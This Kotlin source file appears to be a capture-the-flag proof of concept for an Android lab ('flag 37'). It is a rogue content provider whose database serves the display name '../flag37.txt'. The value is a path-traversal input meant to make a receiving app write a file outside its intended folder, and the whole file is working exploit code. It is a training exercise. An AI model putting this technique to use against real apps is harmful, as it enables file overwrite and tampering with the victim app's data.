package com.example.hetreepoc

import android.content.ContentProvider
import android.content.ContentValues
import android.content.Context
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.net.Uri
import android.provider.BaseColumns
import android.util.Log
import androidx.core.content.FileProvider

private class PoCDbHelper(context: Context?) : SQLiteOpenHelper(context, DATABASE_NAME, null, DATABASE_VERSION) {

    object PocEntry : BaseColumns {
        const val TABLE_NAME = "poc"
        const val DISPLAY_NAME = "_display_name"
        const val SIZE = "_size"
    }
    private val SQL_CREATE_ENTRIES =
        "CREATE TABLE ${PocEntry.TABLE_NAME} (" +
                "${BaseColumns._ID} INTEGER PRIMARY KEY," +
                "${PocEntry.DISPLAY_NAME} TEXT," +
                "${PocEntry.SIZE} INTEGER)"
    private val SQL_DELETE_ENTRIES = "DROP TABLE IF EXISTS ${PocEntry.TABLE_NAME}"

    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL(SQL_CREATE_ENTRIES)

        // Create a new map of values, where column names are the keys
        val values = ContentValues().apply {
            put(PocEntry.DISPLAY_NAME, "../flag37.txt")
            put(PocEntry.SIZE, 1337)
        }
        // Insert the new row, returning the primary key value of the new row
        db.insert(PocEntry.TABLE_NAME, null, values)
    }
    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        // This database is only a cache for online data, so its upgrade policy is
        // to simply to discard the data and start over
        db.execSQL(SQL_DELETE_ENTRIES)
        onCreate(db)
    }
    override fun onDowngrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        onUpgrade(db, oldVersion, newVersion)
    }

    companion object {
        // If you change the database schema, you must increment the database version.
        const val DATABASE_VERSION = 1
        const val DATABASE_NAME = "Flag37PoC.db"
    }
}

class Flag37ContentProvider : FileProvider() {
    private lateinit var  dbHelper: SQLiteOpenHelper

    override fun onCreate(): Boolean {
        dbHelper = PoCDbHelper(context)
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?
    ): Cursor {

        val db = dbHelper.readableDatabase
        val cursor = db.query(
            PoCDbHelper.PocEntry.TABLE_NAME,   // The table to query
            null,             // The array of columns to return (pass null to get all)
            null,              // The columns for the WHERE clause
            null,          // The values for the WHERE clause
            null,                   // don't group the rows
            null,                   // don't filter by row groups
            null               // The sort order
        )
        Log.i(Flag37ContentProvider::class.java.name, Utils.dumpContentProvider(cursor))
        return cursor
    }

    override fun getType(uri: Uri): String? {
        TODO("Not yet implemented")
    }

    override fun insert(uri: Uri, values: ContentValues?): Uri? {
        TODO("Not yet implemented")
    }

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int {
        TODO("Not yet implemented")
    }

    override fun update(
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<out String>?
    ): Int {
        TODO("Not yet implemented")
    }
}